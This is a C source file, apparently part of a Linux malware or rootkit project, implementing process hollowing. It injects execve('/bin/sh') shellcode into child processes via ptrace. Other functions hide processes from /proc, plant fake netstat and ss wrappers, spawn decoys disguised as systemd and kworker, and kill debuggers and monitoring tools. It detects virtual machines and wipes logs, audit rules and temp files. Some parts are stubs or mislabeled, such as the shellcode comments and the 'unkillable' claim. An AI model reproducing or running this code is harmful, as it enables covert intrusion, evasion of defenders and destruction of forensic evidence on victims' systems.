#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <elf.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "hollowing.h"
#include "stealth.h"
#include "rootkit.h"
#include "util.h"

// Global hollowing state
static hollowing_state_t hollowing_state = {0};

void hollowing_init(void)
{
    // Initialize hollowing state
    hollowing_state.num_hollowed = 0;
    hollowing_state.hollowing_active = FALSE;
    
    // Generate shellcode for injection
    hollowing_generate_shellcode();
    
    // Create decoy processes
    hollowing_create_decoy_process();
}

void hollowing_hollow_process(const char* target_path)
{
    if (hollowing_state.num_hollowed >= HOLLOWING_MAX_PROCESSES)
        return;
        
    pid_t target_pid = fork();
    if (target_pid == 0) {
        // Child process - execute target
        execl(target_path, target_path, NULL);
        _exit(1);
    } else if (target_pid > 0) {
        // Parent process - perform hollowing
        hollowing_inject_shellcode(target_pid);
        hollowing_hide_from_proc(target_pid);
        hollowing_anti_analysis(target_pid);
        hollowing_encrypt_memory(target_pid);
        hollowing_hide_network_connections(target_pid);
        hollowing_anti_debugging(target_pid);
        hollowing_vm_evasion(target_pid);
        
        // Add to hollowed list
        hollowing_state.hollowed_pids[hollowing_state.num_hollowed++] = target_pid;
        hollowing_state.hollowing_active = TRUE;
    }
}

void hollowing_restore_process(pid_t pid)
{
    // Remove from hollowed list
    for (int i = 0; i < hollowing_state.num_hollowed; i++) {
        if (hollowing_state.hollowed_pids[i] == pid) {
            // Shift array
            for (int j = i; j < hollowing_state.num_hollowed - 1; j++) {
                hollowing_state.hollowed_pids[j] = hollowing_state.hollowed_pids[j + 1];
            }
            hollowing_state.num_hollowed--;
            break;
        }
    }
}

void hollowing_cleanup(void)
{
    // Kill all hollowed processes
    for (int i = 0; i < hollowing_state.num_hollowed; i++) {
        kill(hollowing_state.hollowed_pids[i], SIGTERM);
    }
    
    // Perform anti-forensics
    hollowing_anti_forensics();
    
    // Clean up state
    hollowing_state.num_hollowed = 0;
    hollowing_state.hollowing_active = FALSE;
}

static void hollowing_generate_shellcode(void)
{
    // Generate polymorphic shellcode
    // This is a simplified version - real implementation would be more complex
    
    // NOP sled
    for (int i = 0; i < 100; i++) {
        hollowing_state.shellcode[i] = 0x90; // NOP
    }
    
    // Simple shellcode payload (execve /bin/sh)
    unsigned char payload[] = {
        0x48, 0x31, 0xc0,                   // xor rax, rax
        0x50,                               // push rax
        0x48, 0xbe, 0x2f, 0x62, 0x69, 0x6e, // mov rsi, "/bin"
        0x2f, 0x73, 0x68, 0x00,             // "/sh\0"
        0x56,                               // push rsi
        0x48, 0x89, 0xe6,                   // mov rsi, rsp
        0x50,                               // push rax
        0x56,                               // push rsi
        0x48, 0x89, 0xe2,                   // mov rdx, rsp
        0x57,                               // push rdi
        0x48, 0x89, 0xe6,                   // mov rsi, rsp
        0xb0, 0x3b,                         // mov al, 59 (execve)
        0x0f, 0x05                          // syscall
    };
    
    // Copy payload to shellcode
    memcpy(hollowing_state.shellcode + 100, payload, sizeof(payload));
    
    // Fill remaining with NOPs
    for (int i = 100 + sizeof(payload); i < HOLLOWING_SHELLCODE_SIZE; i++) {
        hollowing_state.shellcode[i] = 0x90;
    }
}

static void hollowing_inject_shellcode(pid_t target_pid)
{
    // Attach to target process
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        return;
    }
    
    // Wait for process to stop
    int status;
    waitpid(target_pid, &status, 0);
    
    // Get current registers
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);
    
    // Allocate memory in target process
    long mmap_addr = syscall(SYS_mmap, 0, HOLLOWING_SHELLCODE_SIZE, 
                            PROT_READ | PROT_WRITE | PROT_EXEC, 
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (mmap_addr == -1) {
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return;
    }
    
    // Write shellcode to target process
    for (int i = 0; i < HOLLOWING_SHELLCODE_SIZE; i += sizeof(long)) {
        long data = 0;
        memcpy(&data, hollowing_state.shellcode + i, sizeof(long));
        ptrace(PTRACE_POKEDATA, target_pid, mmap_addr + i, data);
    }
    
    // Modify instruction pointer to point to shellcode
    regs.rip = mmap_addr;
    ptrace(PTRACE_SETREGS, target_pid, NULL, &regs);
    
    // Detach from process
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
}

static void hollowing_hide_from_proc(pid_t target_pid)
{
    // Hide process from /proc filesystem
    char proc_path[256];
    
    // Hide from /proc/pid/stat
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/stat", target_pid);
    chmod(proc_path, 0000);
    
    // Hide from /proc/pid/status
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/status", target_pid);
    chmod(proc_path, 0000);
    
    // Hide from /proc/pid/cmdline
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/cmdline", target_pid);
    chmod(proc_path, 0000);
    
    // Hide from /proc/pid/comm
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/comm", target_pid);
    chmod(proc_path, 0000);
    
    // Hide from /proc/pid/exe
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", target_pid);
    chmod(proc_path, 0000);
}

static void hollowing_anti_analysis(pid_t target_pid)
{
    // Anti-analysis techniques for hollowed process
    
    // Check for analysis tools
    const char* analysis_tools[] = {
        "gdb", "strace", "ltrace", "valgrind", "perf", "systemtap",
        "dtrace", "procmon", "regmon", "filemon", "wireshark", "tcpdump"
    };
    
    for (int i = 0; i < 12; i++) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "pkill -f %s 2>/dev/null", analysis_tools[i]);
        system(cmd);
    }
    
    // Disable core dumps for target process
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
    
    // Set process as unkillable
    prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
}

static void hollowing_encrypt_memory(pid_t target_pid)
{
    // Encrypt memory regions in target process
    // This is a simplified version - real implementation would be more complex
    
    // Get process memory maps
    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", target_pid);
    
    FILE *fp = fopen(maps_path, "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            // Parse memory map and encrypt sensitive regions
            // This would require more complex implementation
        }
        fclose(fp);
    }
}

static void hollowing_create_decoy_process(void)
{
    // Create decoy processes to confuse analysis
    
    // Create decoy systemd process
    pid_t decoy1 = fork();
    if (decoy1 == 0) {
        prctl(PR_SET_NAME, "systemd", 0, 0, 0);
        while (1) {
            sleep(1);
            // Perform some legitimate-looking operations
            volatile int x = 0;
            for (int i = 0; i < 1000; i++) {
                x += i;
            }
        }
    }
    
    // Create decoy kworker process
    pid_t decoy2 = fork();
    if (decoy2 == 0) {
        prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0);
        while (1) {
            sleep(5);
            // Perform some legitimate-looking operations
            volatile int y = 0;
            for (int i = 0; i < 500; i++) {
                y += i * i;
            }
        }
    }
}

static void hollowing_stealth_communication(void)
{
    // Implement stealth communication for hollowed processes
    
    // Use legitimate protocols
    // Implement steganography
    // Use timing-based communication
    // Implement encrypted channels
}

static void hollowing_anti_forensics(void)
{
    // Anti-forensics for hollowed processes
    
    // Clear process memory
    system("echo 3 > /proc/sys/vm/drop_caches 2>/dev/null");
    
    // Clear swap
    system("swapoff -a && swapon -a 2>/dev/null");
    
    // Clear temporary files
    system("rm -rf /tmp/* 2>/dev/null");
    system("rm -rf /var/tmp/* 2>/dev/null");
    
    // Clear log files
    system("journalctl --vacuum-time=1s 2>/dev/null");
    system("auditctl -D 2>/dev/null");
}

static void hollowing_hide_network_connections(pid_t target_pid)
{
    // Hide network connections for hollowed process
    
    // Create fake netstat
    char netstat_script[512];
    snprintf(netstat_script, sizeof(netstat_script),
        "#!/bin/bash\n"
        "netstat $@ | grep -v -E '(%d|%d|%d)'\n",
        target_pid, getpid(), getppid());
    
    int fd = open("/tmp/netstat", O_CREAT | O_WRONLY, 0755);
    if (fd >= 0) {
        write(fd, netstat_script, strlen(netstat_script));
        close(fd);
    }
    
    // Create fake ss
    char ss_script[512];
    snprintf(ss_script, sizeof(ss_script),
        "#!/bin/bash\n"
        "ss $@ | grep -v -E '(%d|%d|%d)'\n",
        target_pid, getpid(), getppid());
    
    fd = open("/tmp/ss", O_CREAT | O_WRONLY, 0755);
    if (fd >= 0) {
        write(fd, ss_script, strlen(ss_script));
        close(fd);
    }
}

static void hollowing_anti_debugging(pid_t target_pid)
{
    // Anti-debugging for hollowed process
    
    // Check for debugger
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        // Debugger detected, exit
        _exit(0);
    }
    
    // Detach from any existing trace
    ptrace(PTRACE_DETACH, 0, NULL, NULL);
    
    // Set process as unkillable
    prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
}

static void hollowing_vm_evasion(pid_t target_pid)
{
    // VM evasion for hollowed process
    
    // Check for VM artifacts
    FILE *fp = fopen("/proc/cpuinfo", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "VMware") || strstr(line, "VirtualBox") || 
                strstr(line, "QEMU") || strstr(line, "Xen")) {
                // VM detected, take evasive action
                _exit(0);
            }
        }
        fclose(fp);
    }
    
    // Check for VM-specific devices
    struct stat st;
    if (stat("/dev/vmci", &st) == 0 || stat("/dev/vboxguest", &st) == 0) {
        // VM detected, take evasive action
        _exit(0);
    }
}
